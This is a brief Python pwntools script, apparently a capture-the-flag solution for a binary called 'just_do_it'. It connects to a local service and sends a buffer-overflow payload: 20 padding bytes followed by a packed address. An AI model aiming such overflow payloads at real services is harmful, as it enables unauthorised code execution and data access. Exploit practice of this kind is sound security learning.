#!/usr/bin/env python

from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
r = remote('127.0.1.1', 13337)

# = process('just_do_it')
#db.attach(r, gdbscript='b *main')

r.sendline("A"*20 + p32(0x804a080))


r.interactive()
